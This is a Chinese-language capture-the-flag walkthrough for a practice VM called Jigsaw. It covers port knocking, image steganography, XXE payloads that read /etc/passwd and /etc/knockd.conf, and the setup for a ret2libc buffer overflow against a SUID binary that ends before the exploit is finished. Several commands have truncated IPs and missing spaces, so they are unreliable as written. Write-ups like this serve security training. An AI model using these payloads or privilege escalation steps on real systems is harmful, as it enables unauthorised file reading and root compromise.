虚拟机的系统你可以在公众中回复：jigsaw，就可以得到虚拟机的下载地址。公众号为：whitehat_day

环境搭建：kali，VBox。

在使用Vbox导入虚拟机时会出现Implementation of the USB 2.0controller not found!的错误提示。

解决办法：需要下载下载Vbox相对应版本的extension pack

查看Vbox的具体版本，然后搜索virtual box usb extension pack6.0.14。我使用的是Vbox的最新版本。会出现下载的链接：https://www.downloadcrew.co.uk/article/20279-virtualbox_extension_pack。下载并安装即可。

 

难度级别：极难

用到的知识：隐写术，端口敲门，XXE xml外部实体注入，缓冲区溢出

 

由于下载虚拟机时，出题者有提示：ARP数据包比端口扫描更重要

                           

一、网络扫描

由于提示ARP数据包更重要，所以首先使用ARP进行扫描。

Arp-scan –localnet–ignoredups

我们发现了目标ip为：

通常会使用nmap进行端口扫描和查找服务与漏洞。但是还是由于作者的提示，我这里就选择使用抓包工具监听网络流量。使用以下的命令，我们可以侦听通过终端的流量，过滤ARP数据包。

Tcpdump -A -n host 192.168.and arp

等待一段时间后，没有发现任何有用的提示。所以怀疑是不是提示是假的或者有误的。尝试从流量中排除arp流量试试。

Tcpdump -A -n host 192.168and not arp

捕获到一条发向UDP 666端口的消息提示。


然后根据提示，使用netcat连接上udp 666端口，进行测试，发现一些有用的基本信息。J19s4w可能还是以后的密码。

Nc -u 192.168 666

   发送j19s4w时，得到一串密文，密文是base64编码的，使用以下命令进行解码破译。

   Python -c “print ‘j19s4w’” | nc -u 192.168.666 -ql | base64 -d

   得到第一个flag。同时还有提示，需要knock5500，6600，7700。需要执行一个称为“端口敲门”的过程。

二、网络扫描

使用nmap以正确的顺序扫描对应的端口。

For knock in 55006600 7700;do nmap -Pn –host-timeout 201 –max-retries 0 -p $knock 192.168.;done

或者直接使用knock来执行命令。Knock需要自己安装。使用apt install knock.

Knock 192.168. 55006600 7700

端口敲门的技术通常是用来保护系统中的关键的端口与服务的，现在已经释放了服务器的端口。接着使用nmap对主机进行全端口扫描。

Nmap -A -T4 -p-192.168

发向端口敲门后，服务器开启了tcp的80端口。

三、枚举信息

打开80端口，观察http服务提供的具体的网页服务。

检查网页源代码，发现新的提示。接着访问/robots.txt，没有该文件。使用dirb进行目录，文件爆破也不行。想了很久，终于发现网页中还有张图片呢，可能采用了图片隐写术。

下载图片

Wget -c http://192.168./jigsaw.gif

使用file命令来验证文件类型，同时使用strings检索文件中的字符串

   File jigsaw.gif

   Strings jigsaw.gif

   发现了可能是目录字符串。尝试访问

   http://192.168./w4n770p14y494m3/

   发现了一个登陆框，经过测试发现输入错误就会有提示。再使用dirb再跑一个目录，依然没有发现更有用的信息。再观察源代码，通过源代码发现登陆是一个xml函数处理的。这让我联想到xml外部实体攻击（XXE）。

四、漏洞利用

显然这个地方确实是XXE类型的攻击。使用burpsuit来拦截http数据包。并在拦截的数据包中插入有效的载荷，攻击载荷参考PayloadsAllTheThings，https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection。

以下是每次尝试登陆时常见的请求示例。

构建的exploit如下，如果攻击成功就会返回/etc/passwd的内容。

<?xmlversion="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ELEMENT test ANY > <!ENTITY my_email SYSTEM"file:///etc/passwd" >]><root><email>&my_email;</email><password></password></root>

现在证明存在漏洞，同时我们知道有一个名为jigsaw的用户具有该计算机的登陆许可。由于这是通过端口敲门保护功能进行的访问，因此理想的做法是读取/etc/knockd.conf敲门端口的服务配置文件信息。

为此，我们只能更改要读取的文件

<?xmlversion="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ELEMENT test ANY > <!ENTITY my_email SYSTEM"file:///etc/knockd.conf" >]><root><email>&my_email;</email><password></password></root>

该文件返回了一些使用“端口敲门”打开和关闭特定端口的设置。此外，还具有允许SSH访问端口22的顺序。

既然我们知道如何开启SSH端口22的顺序。就来开启22端口

Knock 192.168 7011 80119011

Nmap -A -T5 -p22192.168.

现在我们来使用之前发现的密码：j19s4w,登陆服务器。

五、提权

搜索具有写、读和执行权限的文件和文件夹，具有sudo权限以及有SUID，/或GUID的可执行文件。该用户不具有sudo权限

Sudo -l

具有SUID，/，GUID可执行文件。

Find / -perm -u=s-type f 2>/dev/null

发现/bin/game3具有SUID的可执行文件

使用file命令查看文件类型，发现是一个ELF32位文件，即linux的可执行文件。对其进行测试发现这可能是栈溢出漏洞。即该二进制文件可能容易受到“缓冲区溢出”的影响。出现Segmentation fault（core dumped）即说明存在该漏洞。

File命令发现该文件是动态链接的libc,并包含所有的调试信息

下载文件到本地

Scp jigsaw@192.168:/bin/game3 ~/ctf/jigsaw

然后使用gdb-peda进行调试。gdb-peda的安装，首先要gdb然后在安装gdb-peda。使用如下命令

git clonehttps://github.com/longld/peda.git ~/pedaecho "source ~/peda/peda.py">> ~/.gdbinit

检查缓冲区长度

再输入一定数量的字符后，可执行文件返回分段失败，即溢出。使用GDB-PEDA技术来确定缓冲区的大小。Pattern_create 200,创建200个字符，EIP地址0x41344141返回溢出。EIP内容为AA4A，使用pattern_offset函数来确定缓冲区大小为76。使用python编写exploit。

测试上面代码，发现EIP的地址被我们的数据BBBB填充。即退出地址已被控制。

获取系统，exit和/bin/sh 的地址去覆盖我们的EIP并写入shell。需要获得系统的libc地址，libc返回地址，libc “/bin/sh”地址。

在目标机中的/tmp下开发exploit，并执行以下命令获取相应的地址。

Ldd /bin/game3 |grep libc

Readelf -s/lib/i386-linux-gnu/libc.so.6 | grep system

Readelf -s/lib/i386-linux-gnu/libc.so.6 |grep exit

Strings -a -t x/lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
